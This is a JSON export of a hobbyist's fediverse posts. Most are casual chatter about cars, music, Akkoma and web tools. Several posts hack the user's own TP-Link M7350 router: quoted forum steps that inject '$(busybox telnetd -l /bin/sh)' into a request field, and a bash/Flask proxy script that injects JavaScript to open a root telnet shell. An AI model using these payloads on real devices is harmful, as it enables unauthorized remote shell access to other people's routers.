[
    {
        "20250824": {
            "value": "<a target=\"_blank\" href=\"https:\/\/m.youtube.com\/watch?v=I8vWfsk8HVU\" style=color:blue>Please Don't Buy a New Car<\/a>\r\n\r\nVs\r\n\r\n<a target=\"_blank\" href=\"https:\/\/m.youtube.com\/watch?v=OHZ93Rq3NbU\" style=color:blue>Please Buy an old Car<\/a>\r\n\r\non the same channel \r\n*rubs eyes*\r\n\r\n\ud809\udc2b many people forget that keeping old, less efficient cars on the road actually saves emissions compared to manufacturing a brand new car. What happened to Reduce, Reuse, & Recycle?\ud809\udc2b\r\n\r\n:confuseddog: \r\n #cars #GladIHaveNoCar",
            "hashtags": "cars, GladIHaveNoCar"
        }
    },
    {
        "20250824": {
            "value": "Thats a new #low for #youtube\r\n\r\nNot that it was important..\r\nBut I already deleted the #source file and ... \r\n\r\nYeah.\r\nNever was #notified by mail either\r\n\r\nAnother:genshin_qiqi_rip: for #google\r\nhttps:\/\/ibb.co\/22DYHhW\r\nhttps:\/\/i.ibb.co\/TXVqd2Y\/Screenshot-20250824-205556-Brave.png\r\n#repost \u2022acws #acws",
            "hashtags": "low, youtube, source, notified, google, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "Well lets see\r\nhttps:\/\/timawesomeness.com\/p\/moderating-akkoma-fediverse\/\r\n\r\n\r\nI hope I won't need this much.\r\nThat <a target=\"_blank\" href=\"https:\/\/i.ibb.co\/BxzLhfb\/Screenshot-20250824-202445-Brave.png\" style=color:blue>suck<\/a>\r\n\r\nBut if its an instance configured to not #interact with others...\r\n\r\n#defederation\r\n#repost \u2022acws #acws #akkoma",
            "hashtags": "interact, defederation, repost, acws, akkoma"
        }
    },
    {
        "20250824": {
            "value": "\ud83d\udcachttps:\/\/alceawis.com\/notice\/AxVEAsengHR8BVgCKu#\ud83d\udcac \r\n\r\nThis instance has #oauth *only* \"\"#login\"\"\r\n\r\nWat ?!\r\n..\r\nhttps:\/\/ibb.co\/TxYK4yqL\r\nhttps:\/\/i.ibb.co\/4nKs8kgd\/Screenshot-20250824-201307-Brave.png\r\n\u2022acws #acws\r\n",
            "hashtags": "oauth, login, acws"
        }
    },
    {
        "20250824": {
            "value": "\ud83d\udcachttps:\/\/akkofe.jeder.pl\/notice\/abtjdi9x0dkyg6q2#\ud83d\udcac \r\n\r\nWhy #people bother with #spotify when #NAS and #PowerAMP are a thing is beyond me \r\n:AnubisPensive: \r\n\r\n<a target=\"_blank\" href=\"https:\/\/www.reddit.com\/r\/indieheads\/comments\/vs29b4\/i_took_a_deep_dive_into_a_strange_spotify_scam\/\" style=color:blue>WhatEven<\/a>\r\n\r\n\u2022acws #acws\r\n\r\n#repost \u2022acws #acws",
            "hashtags": "people, spotify, NAS, PowerAMP, acws, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "Just saw someone asking someoneelse for #permission to #boost their <a target=\"_blank\" href=\"https:\/\/ohai.social\/@ikklegemzuniverseplus\/115011256270751913\" style=color:blue>posts<\/a>\r\n\r\nIs this.. Where we are in 2025 ?\r\n\r\nI would get it if it wqs about #qrt (which #akkoma already has :AlceaLolFace:  ) but if you are not ok with people #boosting your stuff I ..\r\n\r\nDon't know\r\n\r\nThen again on #X \/ #Twitter I got berated for #interacting with people.\r\n\r\nOne even went out of her way to give me a 1200 chara essay aboit how to properly adress etc.\r\n\r\nBut that one time someone came to \"defend\" someoneelse.. He was very smart was peak social media.\r\n\r\nEven if you give people the right answe..\r\n\r\nOh I'm getting off track.\r\n\r\nAnyways.\r\n\r\nWat :blobcatgoogly: \r\n#repost \u2022acws #acws",
            "hashtags": "permission, boost, qrt, akkoma, boosting, X, Twitter, interacting, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "#CurrListeningAlcea\r\nYu-Gi-Oh! Go Rush!! Opening 1 HD + Eng sub\r\nhttps:\/\/www.youtube.com\/watch?v=JvDhDZkYbfY\r\n#repost \u2022acws #acws",
            "hashtags": "CurrListeningAlcea, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "#CurrListeningAlcea\r\nI LOVE YOU - lasah\r\nhttps:\/\/www.youtube.com\/watch?v=5NjsWxrRwnU\r\n#repost \u2022acws #acws",
            "hashtags": "CurrListeningAlcea, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "As the #Fediverse accounts which seemingly are nothing *but* boosts are annoying.\r\n\r\nA tool to list only posts n replies.\r\n\r\nI come for your posts, not your reacts !\r\nhttps:\/\/codepen.io\/ryedai1\/pen\/zxvaEeg\r\n\r\n<a target=\"_blank\" href=\"https:\/\/alcea-wisteria.de\/PHP\/0demo\/2023-08-15-JSFiddle-Clone\/htmls\/2025-08-24-Find-actual-Fedi-posts.html?url=uttps:\/\/alceawis.com\/notice\/AxV0FMJjwpFPyU4PZY\" style=color:blue>Demo<\/a>\r\n\r\n#CodeAlcea\r\n\r\nSupports #pagination so you could tehnically read distraction free free through someone's post history\r\n#repost \u2022acws #acws",
            "hashtags": "Fediverse, CodeAlcea, pagination, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "\ud83d\udcachttps:\/\/woof.tech\/@meluzzy\/115084264055311108#\ud83d\udcac \r\nI thought the same all my life ..\r\n\r\nBut we are considering a lil appartment someday ..\r\nJust something cute.\r\nThen I can pass on all my moe moe to someone after I play rainbowhockey too hard.\r\n\r\nI see it as optional.\r\nBut I like the idea of making my walls #pink \ud83e\ude77\r\n\r\nYour mom just forgot one crucial detail.\r\n#Prices\r\n\r\nI'd tell her \r\n<blockquote> I'll buy one if you find me a cheap one <\/blockquote>\r\n\r\n#repost \u2022acws #acws",
            "hashtags": "pink, Prices, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "If I had 1\u00a2 for each person I talked to on #Fediverse just once that never came back on ever ..\r\n\r\nI'd probably have like 30.\r\nWhich is not much.\r\nButnits weird it happened 30 ti-..\r\n<hr>\r\n\r\nOh this is #boring.\r\n\r\nBut #Fedi user retention is really low.\r\nThe lack of #intrusive #ads and #loud #angry mobs must scare people off.\r\n\r\nAnyways here is #Greenday : <a target=\"_blank\" href=\"https:\/\/m.youtube.com\/watch?v=pGhwBFYtn1s&pp=0gcJCa0JAYcqIYzv\" style=color:blue>*click*<\/a>\r\n#repost \u2022acws #acws #mastodon #twitter #akkoma #firefish #calckey #whateverelsethereis",
            "hashtags": "Fediverse, boring, Fedi, intrusive, ads, loud, angry, Greenday, repost, acws, mastodon, twitter, akkoma, firefish, calckey, whateverelsethereis"
        }
    },
    {
        "20250824": {
            "value": "Maybe I should add a \r\n<hr>\r\n\"<a target=\"_blank\" href=\"https:\/\/alceawis.de\/other\/extra\/scripts\/ffmpeg\/ffmpeg-compress.html\" style=color:blue>videocompressor<\/a>, stay below [one] meg pls as I'm too lazy to allow higher filesizes or use UTubeee\" \r\n<hr>\r\n#disclaimer to this #instance 's signup :PinkCatNod: \r\n\r\nIt's scary how I got used to this..\r\nBut current media upload folder weighs just 38 meg, its worth it for the long run\r\n\r\n\ud809\udc2bThis is the instance with the #botanical name and draconic file upload size restriction.\r\nHave fun !\ud809\udc2b\r\n:crazylaugh: \r\nhttps:\/\/ibb.co\/BK4C2Tk2\r\nhttps:\/\/i.ibb.co\/93wrHyPH\/Screenshot-20250824-165824-Brave.png\r\n\r\n\r\n#repost \u2022acws #acws",
            "hashtags": "disclaimer, instance, botanical, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "Something I'd always wanted:\r\nA quick way to add two images together as #icon\r\n\r\n(It's quite fun to play around with somehow :ablobcatbongo: )\r\nhttps:\/\/codepen.io\/ryedai1\/pen\/PwPaKBw\r\n\r\n#CodeAlcea\r\n#repost \u2022acws #acws #LetsReplaceWithJS #ImageMmagick",
            "hashtags": "icon, CodeAlcea, repost, acws, LetsReplaceWithJS, ImageMmagick"
        }
    },
    {
        "20250824": {
            "value": "\ud83d\udcachttps:\/\/mas.to\/@alcea\/115084168318088308#\ud83d\udcac \r\n\r\nYeah.. This is why I rarely post on #mastodon..\r\n#HTML not rendering is a blight !\r\n\u2022acws #acws\r\n\r\n#repost \u2022acws #acws",
            "hashtags": "mastodon, HTML, acws, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "\ud809\udc2bDownload\r\n23 \r\nMbit\/s\r\n\r\nUpload\r\n\r\n19,3 \r\nMbit\/s\r\n\ud809\udc2b\r\n\r\nHmm\r\nI have no #idea ..\r\nSometimes feels as if the #internet is randomly going :AxelHype: on me ...\r\nUh\r\nhttps:\/\/ibb.co\/Pvpdygtk\r\nhttps:\/\/i.ibb.co\/4nyHLpJk\/Screenshot-20250824-160508-Brave.png\r\n\r\n#speedtest #ohno #internet #internetbucket\r\n(This is why I write #php tools for everything, so I can still use the inet w.o. \"issue\" \ud83e\udee0)\r\n\r\nThe <a target=\"_blank\" href=\"https:\/\/www.youtube.com\/watch?v=HB8Lr6N8Uso\" style=color:blue>latenshi<\/a> really is terrible \r\n#repost \u2022acws #acws",
            "hashtags": "idea, internet, speedtest, ohno, internet, internetbucket, php, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "\ud809\udc2bpew Pew\ud809\udc2b\r\n\r\nWhen a #reddit or improvises #ApexLegends #SFX \ud83d\ude39\r\nhttps:\/\/www.reddit.com\/r\/apexlegends\/comments\/1my4ko7\/audio_broke_on_a_clutch_clip_so_i_improvised\/",
            "hashtags": "reddit, ApexLegends, SFX"
        }
    },
    {
        "20250824": {
            "value": "Her #conceptart looked even <a target=\"_blank\" href=\"https:\/\/www.reddit.com\/r\/apexlegends\/comments\/16u34a3\/the_concept_art_for_catalyst_looked_so_much\/\" style=color:blue>cooler<\/a>, but this looks very cool too\r\nhttps:\/\/alceawis.com\/uploads\/9a197b7ddc9bb1468f6f9d1663ce0ec88350c5b69aa1a6a04c52ee043af5111a.png\r\n#ApexLegends #Catalyst\r\n\r\n#repost \u2022acws #acws",
            "hashtags": "conceptart, ApexLegends, Catalyst, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "So... If you <a target=\"_blank\" href=\"https:\/\/fed.brid.gy\/\" style=color:blue>bridge<\/a> your #Fediverse (f.e. #Akkoma or #Mastodon ) to #Bluesky .. the shorthand #emoji simply display as &#58;emoji&#58; on there\r\n\r\n#WhatsThePoint ?\r\n\r\nAre they to lazy to integrate #ActivityPub ?\r\n\r\nLame !\r\n\r\n(Iirc #Threads has <a target=\"_blank\" href=\"https:\/\/www.ianbrown.tech\/2024\/10\/09\/mastodon-and-bluesky-show-interoperability-in-action\/\" style=color:blue>some<\/a> integration ... And #Tumblr ? <a target=\"_blank\" href=\"https:\/\/www.reddit.com\/r\/fediverse\/comments\/168uzeb\/any_update_on_tumblr_activitypub_support\/\" style=color:blue>whoknows ???<\/a>\r\n\r\nAnyways.\r\nBluesky better not be too proud of emselves.\r\nNot yet.\r\n#repost \u2022acws #acws",
            "hashtags": "Fediverse, Akkoma, Mastodon, Bluesky, emoji, 58, 58, WhatsThePoint, ActivityPub, Threads, Tumblr, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "\ud83d\udcachttps:\/\/alceawis.com\/notice\/AxUD1VBFIrD9edrNCq#\ud83d\udcac \r\n\r\nHah !\r\nhttps:\/\/hub.vroid.com\/en\/characters\/6852035531889224200\/models\/3431949501350861701\r\n\r\nHere we\r\n<a target=\"_blank\" href=\"https:\/\/www.youtube.com\/watch?v=ybn8h-cvofo&feature=youtu.be\">go<\/a> !\r\n\r\n:PinkCatNod: \r\n\r\n\u2022acws #acws #VroidStudio #Anubis\r\nOriginal Design: <a target=\"_blank\" href=\"https:\/\/bsky.app\/profile\/alceawisteria.bsky.social\/post\/3lx54hjlq6c2c\" style=color:blue>@celphase.bsky.social<\/a>\r\n\r\n\r\n",
            "hashtags": "acws, VroidStudio, Anubis"
        }
    },
    {
        "20250824": {
            "value": "When your #mascot has .. \r\n\r\n:AnubisPensive:\r\n\r\nNo <a target=\"_blank\" href=\"https:\/\/en.m.wikipedia.org\/wiki\/Anubis_(software)\" style=color:blue>name<\/a> !\r\n#Anubis  #CELPHASE\r\n\r\nMaybe I'll model her in #vroid \ud83d\ude39\r\n#repost \u2022acws #acws",
            "hashtags": "mascot, Anubis, CELPHASE, vroid, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "#tvcharts \r\n\r\nAnd ofc only popular shows are really fully handled.\r\n<a target=\"_blank\" href=\"https:\/\/tvcharts.co\/show\/yu-gi-oh-vrains-tt5628740\" style=color:blue>nonpopular<\/a> ones aren't even fully done.\r\nLet alone <a target=\"_blank\" href=\"https:\/\/tvcharts.co\/show\/phantom-thief-jeanne-tt0272988\" style=color:blue>obscure<\/a> ones.\r\n\r\nonly <a target=\"_blank\" href=\"https:\/\/tvcharts.co\/show\/the-mentalist-tt1196946\" style=color:blue>reallife dramas<\/a> and such have a complete #rating scale.\r\nThere are not even reasonings given for episode ratings, just numbers\r\nThis site is not very good\r\n#tv\r\n#repost \u2022acws #acws",
            "hashtags": "tvcharts, rating, tv, repost, acws"
        }
    },
    {
        "20250824": {
            "value": "A #windows update that breaks #SSD s ?\r\nhttps:\/\/m.youtube.com\/watch?v=sU_WepeHUd8",
            "hashtags": "windows, SSD"
        }
    },
    {
        "20250823": {
            "value": "\ud809\udc2bInsert a FAT-formatted SD card. This will be used to store all recordings.\r\nConnect the device via WiFi or USB Tethering -- you should be able to view the TP-Link admin page on http:\/\/192.168.0.1.\r\nDownload the latest release (must be at least 0.3.0) for windows-x86_64, and unpack the zipfile.\r\nOpen PowerShell or CMD in that extracted folder, the installer: .\/installer tplink\r\nFollow the instructions on the screen, if there are any.\r\n\ud809\udc2b\r\nhttps:\/\/github.com\/EFForg\/rayhunter\/releases\r\n#tplink #rayhunter",
            "hashtags": "tplink, rayhunter"
        }
    },
    {
        "20250823": {
            "value": "#tplink\r\n#openwrt #ddwrt\r\n\r\nhttps:\/\/wiki.dd-wrt.com\/wiki\/index.php\/Supported_devices#TP-Link https:\/\/www.tp-link.com\/de\/support\/download\/m7350\/v9\/#Firmware",
            "hashtags": "tplink, openwrt, ddwrt, TP, Firmware"
        }
    },
    {
        "20250823": {
            "value": "<blockquote>\r\nLet's go find you a house !<\/blockquote>\r\n<br>\r\nI should replay #FFVII ....\r\nI don't remember this part \r\n#SillyCea\r\nhttps:\/\/alceawis.com\/uploads\/16d827ddb49a72a099d2db987855dd08dc0579d12e1837f0806333316338a29b.mp4\r\n#repost \u2022acws #acws",
            "hashtags": "FFVII, SillyCea, repost, acws"
        }
    },
    {
        "20250823": {
            "value": "#DrawingWiffWaffles posting ???\r\n\r\nhttps:\/\/www.youtube.com\/watch?v=AR5COqhc_E8\r\n\r\n*gotta watch for my #traditional #art fix :strawbHuggies: *\r\n#repost \u2022acws #acws",
            "hashtags": "DrawingWiffWaffles, traditional, art, repost, acws"
        }
    },
    {
        "20250823": {
            "value": "\ud83d\udcachttps:\/\/alceawis.com\/notice\/AxT4TBACE3K8w5X1Si#\ud83d\udcac \r\n\r\nThis song could've been written by me *\r\n:Alcea_Salute:  \r\n(Not sure if I could sing it tho )\r\n\r\n*Would've reduced the strong lang and increased #metaphors tho :ablobcatnomcookie:\r\n\r\n#MaybeIllwriteASongOneDay\r\n\u2022acws #acws",
            "hashtags": "metaphors, MaybeIllwriteASongOneDay, acws"
        }
    },
    {
        "20250823": {
            "value": "#CurrListeningAlcea\r\nNicht Ich - #MadelineJuno\r\nhttps:\/\/www.youtube.com\/watch?v=5PVQ3JkOA3Y\r\n\r\n(Guess 2025 has some ups.\r\n... :Alcea_Smile: )\r\n#repost \u2022acws #acws",
            "hashtags": "CurrListeningAlcea, MadelineJuno, repost, acws"
        }
    },
    {
        "20250823": {
            "value": "\ud83d\udcachttps:\/\/alceawis.com\/notice\/AxT2vXux1JDlhrnd32#\ud83d\udcac \r\n\r\nThis gives \"buying a new router\" an entirely new meaning ...\r\n\r\nThe M7350 I have seems to be secure enough against #routersploit ...\r\nSo yeah.\r\n\r\nBetter not upgrade at this point.\r\n\r\n*Sigh*\r\n\r\nDepressing \r\n\r\n:AshNotAmused: \r\n\r\n\u2022acws #acws",
            "hashtags": "routersploit, acws"
        }
    },
    {
        "20250823": {
            "value": "If you change your #fediverse #account #password\r\n( #akkoma #firefish #misskey #mastodon)\r\n\r\nIt will reset your #oauth token validity\r\n(For akkoma you need to <a target=\"_blank\" href=\"https:\/\/alcea-wisteria.de\/PHP\/0demo\/2023-08-15-JSFiddle-Clone\/htmls\/2024-08-15-Akkoma-Pleroma-apikey-generator.html\" style=color:blue>request<\/a> a new one ...)\r\n\r\n#GoodToKnow ...\r\n#repost \u2022acws #acws",
            "hashtags": "fediverse, account, password, akkoma, firefish, misskey, mastodon, oauth, GoodToKnow, repost, acws"
        }
    },
    {
        "20250823": {
            "value": "#tplink #security\r\n\ud809\udc2b\r\n[PSA] Newer TP-Link Routers send ALL your web traffic to 3rd party servers...\r\nrecently enabled a DNS gateway to be able to see requests from my router, and network devices. Was surprised to find 80K + requests (in 24 hours) out to an Avira \"Safe Things\" subdomains *.safethings.avira.com (far more than any other server).\r\n\r\nDigging into this more, I found that it is related to the built-in router security \"Home Shield\" that ships with newer TP-Link routers - https:\/\/oem.avira.com\/en\/solutions\/safethings-for-router-manufacturers\r\n\r\nHere is the kicker though, I have the Avira \/ Home Shield services completely turned off (I wasn't even subscribed to their paid service for it). The router doesn't care, and sends ALL your traffic to be \"analyzed\" anyhow. See this response from TP Link (towards bottom of review) from last year - https:\/\/www.xda-developers.com\/tp-link-deco-x68-review\/#:~:text=TP%2DLink%20says%20the%20network%20activity\r\n\ud809\udc2b\r\n\r\n#Dystopian ...\r\n:ablobcatcry: #router\r\n\r\nAre we doing #tuya 2.0 ???\r\n#repost \u2022acws #acws",
            "hashtags": "tplink, security, Dystopian, router, tuya, repost, acws"
        }
    },
    {
        "20250823": {
            "value": "\ud809\udc2b\r\nI didn\u2019t choose grep. grep chose me\r\nLet\u2019s grep for the qcmap_webclient_cgi_file file. Another process will likely be listening to this file. God I love grep.\r\n\r\n$ grep -r qcmap_webclient_cgi_file\r\nBinary file data\/bin\/QCMAP_Web_CLIENT matches\r\nBinary file system\/WEBSERVER\/www\/cgi-bin\/qcmap_web_cgi matches\r\n\r\n\ud809\udc2b\r\nThat was actually quite fun to read\r\n#ghidra #tplink #webserver #vulnerability\r\n\r\n(Current status:\r\nGot #Fastboot working. Thats it. haha)\r\nhttps:\/\/www.pentestpartners.com\/security-blog\/cve-2019-12103-analysis-of-a-pre-auth-rce-on-the-tp-link-m7350-with-ghidra\/\r\n#repost \u2022acws #acws",
            "hashtags": "ghidra, tplink, webserver, vulnerability, Fastboot, repost, acws"
        }
    },
    {
        "20250823": {
            "value": "\ud809\udc2b4PDA forum members found a RCE to start telnet on the device. We need to write a script to start telnet and gain shellaccess. Maybe we can do a rust implementation.\r\n\r\n1. Install (if you use another browser) Firefox or Google Chrome, I did everything on Fox, but the steps are similar;\r\n2. Reset the router to factory settings via the Web and set the standard log&pass to log in to the Web - admin:admin (not necessary, but preferable, save the settings on your computer, then restore);\r\n3. Log in to the Webface through your browser using the router\u2019s IP address and log in;\r\n4. Go to the Advanced -> Storage Sharing settings and in Access Mode , select the By USB mode (for those who have By Wi-Fi), this will then allow you not to be distracted by unnecessary open ports in the scanner;\r\n5. Press F12 to switch to development mode, in the panel that opens, select the tab - Network ;\r\n6. Just below in the filter input line, type - method:POST ;\r\n7. Select any request to the qcmap_web_cgi file - the details tab for this request opens, the tab - Headers must be selected in it ;\r\n8. Select in it - Change and send again ; 9. The Request Headers and Request Body\r\nbars appear - copy the token value into some text file from one of these windows , this will be a set of 16 characters, as an example from the Request Headers - Cookie: tpweb_token=TxEUQx-FJD49oB5b , copy TxEUQx-FJD49oB5b ; 10. Remove ALL text from the Request Headers and Request Body and\/or reduce them to the following form:\r\n\r\n # \r\nRequest headers:\r\nHost: 192.168.0.1\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko\/20100101 Firefox\/75.0\r\nAccept: application\/json, text\/javascript, *\/*; q=0.01\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application\/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 103\r\nOrigin: http:\/\/192.168.0.1\r\nConnection: close\r\nReferer: http:\/\/192.168.0.1\/settings.html\r\nCookie: tpweb_token=\u0412\u0430\u0448\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 token\r\n # \r\nRequest body:\r\n{\"token\":\"\u0412\u0430\u0448\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 token\",\"module\":\"webServer\",\"action\":1,\"language\":\"$(busybox telnetd -l \/bin\/sh)\"}\r\n\r\n11. Click Send . With this we launched telnet on the route , but it ruined its Web face and the text stopped displaying;\r\n12. Now let\u2019s restore the settings - repeat steps 7, 8 and 10 with the following data in the Request Headers and Request Body :\r\n # \r\nRequest headers:\r\nHost: 192.168.0.1\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko\/20100101 Firefox\/75.0\r\nAccept: application\/json, text\/javascript, *\/*; q=0.01\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application\/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 76\r\nOrigin: http:\/\/192.168.0.1\r\nConnection: close\r\nReferer: http:\/\/192.168.0.1\/settings.html\r\nCookie: tpweb_token=\u0412\u0430\u0448\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 token\r\n # \r\nRequest body:\r\n{\"token\":\"\u0412\u0430\u0448\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 token\",\"module\":\"webServer\",\"action\":1,\"language\":\"en\"}\r\n\r\n\r\nhttps:\/\/github.com\/m0veax\/tplink_m7350\/tree\/main\/assets\/webinterface_rce_telnet13. Click Send . \ud809\udc2b\r\nhttps:\/\/www.pentestpartners.com\/security-blog\/cve-2019-12103-analysis-of-a-pre-auth-rce-on-the-tp-link-m7350-with-ghidra\/\r\n\r\nmore #tplink hacking nonsense",
            "hashtags": "tplink"
        }
    },
    {
        "20250823": {
            "value": "\ud809\udc2bHack TP-Link M7350\r\nhttps:\/\/github.com\/m0veax\/tplink_m7350?tab=readme-ov-file#start-adbd\r\n--------------------------------\r\n\r\n\r\nhold power, then plug into usb\r\n\r\nIn cmd do:\r\n\"cmd -> fastboot devices\"\r\n\r\nif ok (f.e. 29c5d2b fastboot) , do\r\n\r\n\"fastboot reboot bootloader\"\r\n\r\nnow you are in fastboot mode\r\n\r\n\r\n\r\n\ud809\udc2b\r\n#tplink #fastboot\r\n#m7350",
            "hashtags": "start, tplink, fastboot, m7350"
        }
    },
    {
        "20250823": {
            "value": "oh the TP-Link M8550 looks great (has a #touchscreen, #lan port, #sim slot #microSD port)\r\nhttps:\/\/www.ebay.de\/sch\/i.html?_nkw=TP-Link+M8550\r\nhttps:\/\/www.computerbase.de\/artikel\/internet\/tp-link-m8550-test-mobiler-5g-router-mobilfunk.93441\/\r\n\r\nBut ... 400 bucks ? Uff. Could get a #Nighthawk for that kinda money.\r\n\r\nI'll stick with my m7350 for now...\r\n\r\n#tplink",
            "hashtags": "touchscreen, lan, sim, microSD, Nighthawk, tplink"
        }
    },
    {
        "20250823": {
            "value": "\ud809\udc2b3) Exhausting system memory before \/cgi\/getParm was requested, causing the router to default to hardcoded RSA keys\ud809\udc2b\r\n\r\nWow the #poor #router !\r\n\r\nI wouldn't want anyone to exhaust my systemmem till I fall back on my default #RSA keys\r\nhttps:\/\/hex.fish\/2021\/05\/10\/tp-link-gdpr\/\r\n\r\nOh wait.\r\nI'm not a router :blobcoffee: \r\n#repost \u2022acws #acws #tplink",
            "hashtags": "poor, router, RSA, repost, acws, tplink"
        }
    },
    {
        "20250823": {
            "value": "Bruteforce #tplink\r\nhttps:\/\/hex.fish\/2021\/05\/10\/tp-link-gdpr\/",
            "hashtags": "tplink"
        }
    },
    {
        "20250823": {
            "value": "\ud83d\udcachttps:\/\/alceawis.com\/notice\/AxSVwDJRoiwHbUy5x2#\ud83d\udcac \r\n\r\nAh.\r\n\r\n:baba_o: :baba_o: :baba_p: :baba_s: :roflcrazylaugh: \r\n\r\n\u2022acws #acws\r\n\r\nShould've seen that one coming \r\nhttps:\/\/ibb.co\/4ZNksynd\r\nhttps:\/\/i.ibb.co\/3yhKfX9z\/Screenshot-20250823-144707-Brave.png\r\n\r\n",
            "hashtags": "acws"
        }
    },
    {
        "20250823": {
            "value": "\ud83d\udcachttps:\/\/alceawis.com\/notice\/AxSS6DyhnYBUkMmgc4#\ud83d\udcac \r\n\u2022acws #acws\r\nHmm\r\n\r\nhttps:\/\/ibb.co\/C3MKGp18\r\nhttps:\/\/i.ibb.co\/KpLxvc0h\/Screenshot-2025-08-23-12-38-19.jpg\r\n\r\n\ud809\udc2btest.sh\r\n--\r\n#!\/bin\/bash\r\nset -e\r\n\r\nread -p \"Enter the target IP: \" TARGET_IP\r\nPORT=\"4000\"\r\n\r\n# Use a safe temporary directory\r\nPYTHON_FILE=\"$(mktemp \/tmp\/exploit_proxy.XXXX.py)\"\r\n\r\necho \"[*] Starting exploit proxy server for target $TARGET_IP...\"\r\n\r\ncleanup() {\r\n    echo \"[*] Cleaning up...\"\r\n    rm -f \"$PYTHON_FILE\"\r\n    echo \"[*] Done.\"\r\n}\r\ntrap cleanup EXIT\r\n\r\n# Write the Python proxy file\r\ncat > \"$PYTHON_FILE\" << EOF\r\nfrom flask import Flask, request, Response\r\nimport requests\r\n\r\napp = Flask(__name__)\r\n\r\nINJECT = br''';window.telnetPoll = window.setInterval(() => {\r\nGlobals.models.PTModel.add({\r\napplicationName: \"telnet\",\r\nenableState: 1,\r\nentryId: 1,\r\nopenPort: \"2300-2400\",\r\nopenProtocol: \"TCP\",\r\ntriggerPort: \"\\\\$(busybox telnetd -l \/bin\/sh)\",\r\ntriggerProtocol: \"TCP\"\r\n});\r\nalert(\"Success! You can telnet to the router.\");\r\nwindow.clearInterval(window.telnetPoll);\r\n}, 1000);'''\r\n\r\nTARGET_IP = \"${TARGET_IP}\"\r\nPORT = ${PORT}\r\n\r\n@app.route('\/', defaults={'path': ''}, methods=[\"GET\", \"POST\"])\r\n@app.route('\/<path:path>', methods=[\"GET\", \"POST\"])\r\ndef proxy(path):\r\n    url = f\"http:\/\/{TARGET_IP}\/\" + path\r\n    if request.query_string:\r\n        url += \"?\" + request.query_string.decode()\r\n\r\n    headers = dict(request.headers)\r\n    headers.pop('Host', None)\r\n\r\n    resp = requests.request(\r\n        method=request.method,\r\n        url=url,\r\n        headers=headers,\r\n        data=request.get_data(),\r\n        cookies=request.cookies,\r\n        allow_redirects=False,\r\n    )\r\n\r\n    content = resp.content\r\n    if path == \"js\/settings.min.js\":\r\n        print(\"[*] Injecting payload into settings.min.js\")\r\n        content += INJECT\r\n        headers = dict(resp.headers)\r\n        headers.pop('Content-Length', None)\r\n        return Response(content, headers=headers, status=resp.status_code)\r\n\r\n    return Response(content, headers=dict(resp.headers), status=resp.status_code)\r\n\r\napp.run(host='127.0.0.1', port=PORT)\r\nEOF\r\n\r\necho \"[*] Local proxy listening on http:\/\/127.0.0.1:${PORT}\"\r\necho \"[*] Open this URL in your browser and log in to the router UI\"\r\necho \"[*] Once the exploit is injected, telnet should be enabled on ${TARGET_IP}:23\"\r\n\r\n# Use Python 3 from PATH or Windows py launcher\r\nif command -v python3 &>\/dev\/null; then\r\n    python3 \"$PYTHON_FILE\"\r\nelif command -v py &>\/dev\/null; then\r\n    py -3 \"$PYTHON_FILE\"\r\nelse\r\n    echo \"Python 3 is not installed or not in PATH!\"\r\n    exit 1\r\nfi\r\n\r\n\r\nbat.bat\r\n--\r\n@echo off\r\n\"C:\\Program Files\\Git\\bin\\bash.exe\" \"test.sh\"\r\npause\ud809\udc2b\r\n\r\nhttps:\/\/github.com\/m0veax\/tplink_m7350\/blob\/main\/open-v5.sh\r\n\r\n127.0.0.1:4000 is sucha goofball adresss :confuseddog: \r\n#TPLink\r\n\r\n",
            "hashtags": "acws, TPLink"
        }
    },
    {
        "20250823": {
            "value": "It's a good #saturday for trying to hack our #TPLink Router\r\n\ud809\udc2b\r\n\r\n(base) C:\\Users\\User\\routersploit>python -m pip install requests paramiko pysnmp pycryptodome\r\nRequirement already satisfied: requests in c:\\users\\user\\anaconda3\\lib\\site-packages (2.32.2)\r\nRequirement already satisfied: paramiko in c:\\users\\user\\anaconda3\\lib\\site-packages (2.8.1)\r\nCollecting pysnmp\r\n  Using cached pysnmp-7.1.21-py3-none-any.whl.metadata (5.1 kB)\r\nRequirement already satisfied: pycryptodome in c:\\users\\user\\anaconda3\\lib\\site-packages (3.23.0)\r\nRequirement already satisfied: charset-normalizer<4,>=2 in c:\\users\\user\\anaconda3\\lib\\site-packages (from requests) (2.0.4)\r\nRequirement already satisfied: idna<4,>=2.5 in c:\\users\\user\\anaconda3\\lib\\site-packages (from requests) (3.7)\r\nRequirement already satisfied: urllib3<3,>=1.21.1 in c:\\users\\user\\anaconda3\\lib\\site-packages (from requests) (2.2.2)\r\nRequirement already satisfied: certifi>=2017.4.17 in c:\\users\\user\\anaconda3\\lib\\site-packages (from requests) (2024.6.2)\r\nRequirement already satisfied: bcrypt>=3.1.3 in c:\\users\\user\\anaconda3\\lib\\site-packages (from paramiko) (3.2.0)\r\nRequirement already satisfied: cryptography>=2.5 in c:\\users\\user\\anaconda3\\lib\\site-packages (from paramiko) (42.0.5)\r\nRequirement already satisfied: 